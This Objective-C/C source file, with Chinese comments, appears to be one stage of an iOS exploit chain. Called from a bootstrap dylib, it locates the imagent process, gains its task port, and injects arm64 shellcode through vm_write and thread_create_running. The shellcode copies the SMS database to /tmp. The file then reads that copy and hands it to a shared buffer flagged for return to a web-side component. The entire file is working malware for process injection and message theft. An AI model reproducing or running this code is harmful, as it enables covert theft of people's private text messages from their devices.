@import Darwin;
@import MachO;
#include <mach-o/ldsyms.h>
#include <sys/sysctl.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <mach/mach.h>

// ===== 共享缓冲区协议常量（与 Stage3_VariantB.js 保持一致） =====
#define STATE_IDLE  0
#define STATE_POST  7

// ===== 函数指针声明 =====
static void* (*_dlsym)(void*, const char*);
static int (*_open)(const char*, int, ...);
static int (*_close)(int);
static ssize_t (*_read)(int, void*, size_t);
static ssize_t (*_write)(int, const void*, size_t);
static void* (*_malloc)(size_t);
static void  (*_free)(void*);
static kern_return_t (*_task_for_pid)(mach_port_t, pid_t, task_t*);
static kern_return_t (*_vm_allocate)(task_t, vm_address_t*, vm_size_t, int);
static kern_return_t (*_vm_write)(task_t, vm_address_t, vm_offset_t, mach_msg_type_number_t);
static kern_return_t (*_vm_protect)(task_t, vm_address_t, vm_size_t, boolean_t, vm_prot_t);
static kern_return_t (*_thread_create_running)(task_t, thread_act_t*, void*, void*, mach_msg_type_number_t);
static mach_port_t (*_mach_task_self)(void);

// ===== 写入共享缓冲区（直接触发 STATE_POST） =====
static void write_to_buffer(uint32_t* D, const char* type, const uint8_t* data, int size) {
    if (!D) return;
    uint8_t* payload = (uint8_t*)(D + 2);
    int i;
    for (i = 0; type[i] && i < 32; i++) payload[i] = type[i];
    payload[i] = '\0';
    int header_size = i + 1;
    for (i = 0; i < size && i < 16777216 - 64; i++)
        payload[header_size + i] = data[i];
    D[1] = header_size + i;
    D[0] = STATE_POST;  // 触发 Web 端回传
}

// ===== 获取进程 PID =====
static pid_t get_pid(const char *name) {
    int mib[4] = {CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0};
    size_t size = 0;
    sysctl(mib, 4, NULL, &size, NULL, 0);
    struct kinfo_proc *procs = (struct kinfo_proc *)_malloc(size);
    if (!procs) return -1;
    sysctl(mib, 4, procs, &size, NULL, 0);
    
    pid_t target = -1;
    int count = size / sizeof(struct kinfo_proc);
    for (int i = 0; i < count; i++) {
        if (strcmp(procs[i].kp_proc.p_comm, name) == 0) {
            target = procs[i].kp_proc.p_pid;
            break;
        }
    }
    _free(procs);
    return target;
}

// ===== 在 imagent 中执行的 shellcode（arm64） =====
static void remote_shellcode(void) {
    asm volatile(
        "mov x0, %0\n"
        "mov x1, %1\n"
        "mov x2, #0\n"
        "mov x16, #59\n"
        "svc #0x80\n"
        :
        : "r"("/bin/cp"), 
          "r"((char*[]){"cp", "/var/mobile/Library/SMS/sms.db", "/tmp/sms_injected.db", 0})
        : "x0", "x1", "x2", "x16"
    );
}

// ===== 注入 imagent 并复制 sms.db =====
static int inject_imagent(void) {
    _task_for_pid = _dlsym(RTLD_DEFAULT, "task_for_pid");
    _vm_allocate = _dlsym(RTLD_DEFAULT, "vm_allocate");
    _vm_write = _dlsym(RTLD_DEFAULT, "vm_write");
    _vm_protect = _dlsym(RTLD_DEFAULT, "vm_protect");
    _thread_create_running = _dlsym(RTLD_DEFAULT, "thread_create_running");
    _mach_task_self = _dlsym(RTLD_DEFAULT, "mach_task_self");
    
    if (!_task_for_pid || !_vm_allocate || !_vm_write || !_vm_protect || !_thread_create_running) {
        return -1;
    }
    
    pid_t pid = get_pid("imagent");
    if (pid <= 0) return -1;
    
    task_t remote_task;
    kern_return_t kr = _task_for_pid(_mach_task_self(), pid, &remote_task);
    if (kr != KERN_SUCCESS) return -1;
    
    size_t code_size = 4096;
    vm_address_t remote_addr;
    kr = _vm_allocate(remote_task, &remote_addr, code_size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) return -1;
    
    kr = _vm_write(remote_task, remote_addr, (vm_offset_t)remote_shellcode, code_size);
    if (kr != KERN_SUCCESS) {
        _vm_protect(remote_task, remote_addr, code_size, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
    }
    
    _vm_protect(remote_task, remote_addr, code_size, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
    
    thread_act_t remote_thread;
    kr = _thread_create_running(remote_task, &remote_thread, (void*)remote_addr, NULL, 0);
    if (kr != KERN_SUCCESS) return -1;
    
    sleep(1);
    return 0;
}

// ===== 读取并回传数据 =====
static void exfil_sms(uint32_t* D) {
    if (!D) {
        // 没有共享缓冲区，写本地文件标记
        int flag = _open("/tmp/sms_no_buffer", O_CREAT | O_WRONLY | O_TRUNC, 0644);
        if (flag >= 0) { _write(flag, "no_buffer", 9); _close(flag); }
        return;
    }
    
    int fd = _open("/tmp/sms_injected.db", O_RDONLY);
    if (fd < 0) {
        const char* msg = "{\"error\":\"open_fail\"}";
        write_to_buffer(D, "sms", (uint8_t*)msg, strlen(msg));
        return;
    }
    
    struct stat st;
    if (fstat(fd, &st) != 0 || st.st_size == 0) {
        const char* msg = "{\"error\":\"stat_fail\"}";
        write_to_buffer(D, "sms", (uint8_t*)msg, strlen(msg));
        _close(fd);
        return;
    }
    
    size_t file_size = (st.st_size > 10 * 1024 * 1024) ? 10 * 1024 * 1024 : st.st_size;
    uint8_t* buf = (uint8_t*)_malloc(file_size);
    if (!buf) {
        const char* msg = "{\"error\":\"malloc_fail\"}";
        write_to_buffer(D, "sms", (uint8_t*)msg, strlen(msg));
        _close(fd);
        return;
    }
    
    ssize_t n = _read(fd, buf, file_size);
    _close(fd);
    
    if (n > 0) {
        write_to_buffer(D, "sms", buf, (int)n);
        int flag = _open("/tmp/sms_exfil_ok", O_CREAT | O_WRONLY | O_TRUNC, 0644);
        if (flag >= 0) { _write(flag, "ok", 2); _close(flag); }
    } else {
        const char* msg = "{\"error\":\"read_fail\"}";
        write_to_buffer(D, "sms", (uint8_t*)msg, strlen(msg));
    }
    _free(buf);
}

// ===== 主入口：由 bootstrap.dylib 调用 =====
int last(void) {
    // 1. 解析基础函数
    _dlsym = dlsym;
    _open = _dlsym(RTLD_DEFAULT, "open");
    _close = _dlsym(RTLD_DEFAULT, "close");
    _read = _dlsym(RTLD_DEFAULT, "read");
    _write = _dlsym(RTLD_DEFAULT, "write");
    _malloc = _dlsym(RTLD_DEFAULT, "malloc");
    _free = _dlsym(RTLD_DEFAULT, "free");
    
    if (!_open || !_read || !_write || !_malloc || !_free) {
        int flag = _open("/tmp/sms_init_fail", O_CREAT | O_WRONLY | O_TRUNC, 0644);
        if (flag >= 0) { _write(flag, "init_fail", 9); _close(flag); }
        return 0;
    }
    
    // 2. 尝试获取共享缓冲区（通过 real_collector 的全局变量）
    uint32_t* D = NULL;
    void* real_collector_handle = dlopen("/tmp/real_collector.dylib", RTLD_NOW);
    if (real_collector_handle) {
        uint32_t** D_ptr = (uint32_t**)dlsym(real_collector_handle, "g_shared_buffer");
        if (D_ptr && *D_ptr) {
            D = *D_ptr;
        }
    }
    
    // 3. 注入 imagent 复制 sms.db
    int ret = inject_imagent();
    if (ret != 0) {
        int flag = _open("/tmp/sms_inject_fail", O_CREAT | O_WRONLY | O_TRUNC, 0644);
        if (flag >= 0) { _write(flag, "inject_fail", 11); _close(flag); }
        return 0;
    }
    
    // 4. 回传数据（如果有共享缓冲区）
    exfil_sms(D);
    
    return 0;
}

int end(void) { return last(); }
